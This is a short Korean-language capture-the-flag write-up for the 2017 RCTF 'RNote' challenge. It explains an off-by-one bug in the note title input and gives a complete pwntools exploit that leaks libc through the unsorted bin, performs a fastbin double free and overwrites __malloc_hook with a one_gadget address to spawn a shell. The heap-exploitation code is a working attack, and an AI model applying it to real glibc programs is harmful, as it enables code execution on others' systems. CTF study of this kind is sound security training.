---
title: "2017 RCTF RNote"
date: 2020-3-2
ctf: RCTF
layout: post
published : false
---

title을 입력한걸 bss영역에 저장하고 bss영역에 힙주소를 저장해놓는데 여기에서 off by one취약점이 발생한다. title을 입력할 때 17바이트를 입력할 수 있다. 왜냐하면 i=0; i<=a2까지이기 때문이다. a2로 오는 인자 값은 16인데 17바이트만큼 입력해서 힙주소를 덮을 수 있다. 

```c
__int64 __fastcall sub_4009C7(__int64 a1, signed int a2)
{
  char buf; // [rsp+1Bh] [rbp-5h]
  unsigned int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; (signed int)i <= a2; ++i )
  {
    if ( read(0, &buf, 1uLL) < 0 )
      exit(1);
    *(_BYTE *)(a1 + (signed int)i) = buf;
    if ( *(_BYTE *)((signed int)i + a1) == 0xA )
    {
      *(_BYTE *)((signed int)i + a1) = 0;
      return i;
    }
  }
  return i;
}
```

unsorted bin attack으로 libc leak해주고 1,2,3번 청크가 있으면 1번 free, 2번 free하고 3번 청크가 1번 청크 주소로 바꾸고 dfb해주면 된다. 그리고 fastbin duplicate해주면 된다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./RNote')
libc = e.libc
p = process('./RNote')
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
note = 0x00000000006020E0
note2 = 0x00000000006020F8

def add(size,title,content):
	sa(':','1')
	sa(':',str(size))
	sla(':',title)
	sla(':',content)

def delete(idx):
	sa(':','2')
	sa(':',str(idx))

def show(idx):
	sa(':','3')
	sa(':',str(idx))

add(256,'A'*8,'B'*8)
add(256,'C'*8,'D'*8)
delete(0)
add(256,'E'*8,'')
show(0)
p.recvuntil('\x7f')
libc_base = u64(p.recvuntil('\x7f')[-6:]+'\x00'*2) - 0x3c4b20 - 88
log.info('libc_base : {}'.format(hex(libc_base)))
malloc_hook = libc_base + libc.symbols['__malloc_hook']
log.info('__malloc_hook : {}'.format(hex(malloc_hook)))

delete(0)
delete(1)

add(0x60,'a','a') # 0
add(0x60,'b','b') # 1 
add(0x60,'c'*0x10+'\x10','c') # 2
p.recvuntil('Invaild choice')

delete(0)
delete(1)
delete(2)

add(0x60,'a',p64(malloc_hook-35))
add(0x60,'a','a')
add(0x60,'a',p64(malloc_hook-35))
add(0x60,'a','A'*19+p64(libc_base + 0xf1147))

sa(':','1')
sa(':','123')

p.interactive()
```

